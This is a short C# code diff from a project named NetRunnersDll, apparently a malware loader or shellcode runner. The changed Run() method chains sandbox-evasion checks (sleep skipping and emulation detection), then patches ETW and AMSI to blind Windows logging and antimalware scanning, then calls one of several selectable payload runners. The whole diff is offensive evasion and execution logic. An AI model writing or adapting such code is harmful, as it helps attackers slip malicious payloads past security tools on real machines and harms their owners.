@@ -19,15 +19,18 @@ namespace NetRunnersDll
         public static void Run()
         {
             // call heuristic functions
-            if (Sleep()) { return; }    // if sleep was skipped halt execution
-            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
-            // patch amsi
-            patchAmsi();
+            if ((!Sleep()) || (!NonEmulated()))
+            {
+                return;
+            }
+            // call patchers
+            if ((!PatchEtw()) || (!PatchAmsi()))
+                return;
 
             // Uncomment your choice
-            // Runner();
-            // PiRunner();
-            epsRun();
+            // Run();
+            // piRun();
+            EpsRun();
         }
     }
 }
